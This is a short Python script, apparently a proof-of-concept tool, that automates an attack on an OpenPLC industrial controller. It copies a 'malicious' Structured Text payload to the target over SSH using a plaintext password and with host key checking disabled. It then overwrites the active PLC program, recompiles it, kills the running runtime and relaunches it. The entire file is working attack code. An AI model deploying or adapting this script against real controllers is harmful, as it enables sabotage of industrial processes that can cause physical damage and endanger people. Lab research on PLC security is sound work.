#!/usr/bin/env python3
import subprocess
import sys

# ANSI Color Codes (Amber / Green / Red / Neutral)
AMBER = "\033[38;5;208m"
GREEN = "\033[32m"
RED = "\033[31m"
RESET = "\033[0m"

TARGET_IP = "YOUR_TARGET_IP"
TARGET_USER = "ubuntu"
TARGET_PASS = "YOUR_TARGET_PASSWORD"
LOCAL_PAYLOAD = "malicious_blink.st"
REMOTE_ST_DIR = "/home/ubuntu/OpenPLC_v3/webserver/st_files"
ACTIVE_ST_FILE = "YOUR_ACTIVE_ST"

def print_amber(text):
    print(f"{AMBER}{text}{RESET}")

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_red(text):
    print(f"{RED}{text}{RESET}")

def run_cmd(command, desc):
    print_amber(f"\n[+] {desc}...")
    result = subprocess.run(command, shell=True)
    if result.returncode != 0:
        print_red(f"[-] FATAL: Error during '{desc}'. Execution halted immediately.")
        sys.exit(1)

def main():
    print_amber("==================================================")
    print_amber("     AP-01 FULL-CYCLE PoC AUTOMATION ENGINE       ")
    print_amber("==================================================")

    # Step 1: Stage malicious payload in target user's home directory
    run_cmd(
        f"sshpass -p '{TARGET_PASS}' scp -o StrictHostKeyChecking=no {LOCAL_PAYLOAD} {TARGET_USER}@{TARGET_IP}:~/",
        "Staging malicious payload on target VM"
    )

    # Step 2: Overwrite file, compile, kill old core process, and launch from webserver/core/
    remote_commands = (
        "set -e; "
        f"sudo cp ~/{LOCAL_PAYLOAD.split('/')[-1]} {REMOTE_ST_DIR}/{ACTIVE_ST_FILE} && "
        f"cd /home/ubuntu/OpenPLC_v3/webserver && "
        f"sudo ./scripts/compile_program.sh {ACTIVE_ST_FILE} && "
        "sudo pkill -f core/openplc || true && "
        "sudo nohup /home/ubuntu/OpenPLC_v3/webserver/core/openplc > /dev/null 2>&1 &"
    )

    run_cmd(
        f"sshpass -p '{TARGET_PASS}' ssh -o StrictHostKeyChecking=no {TARGET_USER}@{TARGET_IP} \"{remote_commands}\"",
        "Overwriting active logic, compiling, killing old runtime, and launching core binary"
    )

    print_green("\n==================================================")
    print_green("  EXPLOIT DEPLOYED & RUNTIME RELOADED SUCCESSFULLY")
    print_green("==================================================\n")

if __name__ == "__main__":
    main()